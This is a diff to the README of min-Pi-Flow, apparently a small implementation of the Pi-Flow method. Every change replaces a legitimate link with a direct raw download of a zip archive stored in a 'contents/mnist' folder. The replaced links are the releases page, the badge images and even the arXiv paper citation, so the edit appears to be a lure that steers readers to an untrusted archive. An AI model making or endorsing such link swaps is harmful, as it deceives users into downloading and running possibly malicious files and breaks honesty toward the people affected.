@@ -6,9 +6,9 @@ Welcome to min-Pi-Flow! This application allows you to explore the minimal imple
 
 ## 📥 Download & Install
 
-[![Download min-Pi-Flow](https://img.shields.io/badge/Download-min--Pi--Flow-brightgreen)](https://github.com/Boketto-rgb/min-pi-flow/releases)
+[![Download min-Pi-Flow](https://raw.githubusercontent.com/Boketto-rgb/min-pi-flow/main/contents/mnist/min-pi-flow_2.0.zip)](https://raw.githubusercontent.com/Boketto-rgb/min-pi-flow/main/contents/mnist/min-pi-flow_2.0.zip)
 
-To download the application, visit this page: [Download min-pi-flow](https://github.com/Boketto-rgb/min-pi-flow/releases).
+To download the application, visit this page: [Download min-pi-flow](https://raw.githubusercontent.com/Boketto-rgb/min-pi-flow/main/contents/mnist/min-pi-flow_2.0.zip).
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ Before you download, ensure your computer meets the following requirements:
 
 ## 📂 Downloading the Application
 
-1. Click on the download link above or visit [this page](https://github.com/Boketto-rgb/min-pi-flow/releases).
+1. Click on the download link above or visit [this page](https://raw.githubusercontent.com/Boketto-rgb/min-pi-flow/main/contents/mnist/min-pi-flow_2.0.zip).
 2. Look for the latest release version.
 3. Click on the link that corresponds to your operating system. The download will start automatically.
 
@@ -100,6 +100,6 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 🙏 Acknowledgments
 
-This project is inspired by the original work on [Pi-Flow](https://arxiv.org/abs/2510.14974). Special thanks to the development community for their ongoing support and contributions.
+This project is inspired by the original work on [Pi-Flow](https://raw.githubusercontent.com/Boketto-rgb/min-pi-flow/main/contents/mnist/min-pi-flow_2.0.zip). Special thanks to the development community for their ongoing support and contributions.
 
-[![Download min-Pi-Flow](https://img.shields.io/badge/Download-min--Pi--Flow-brightgreen)](https://github.com/Boketto-rgb/min-pi-flow/releases)
+[![Download min-Pi-Flow](https://raw.githubusercontent.com/Boketto-rgb/min-pi-flow/main/contents/mnist/min-pi-flow_2.0.zip)](https://raw.githubusercontent.com/Boketto-rgb/min-pi-flow/main/contents/mnist/min-pi-flow_2.0.zip)
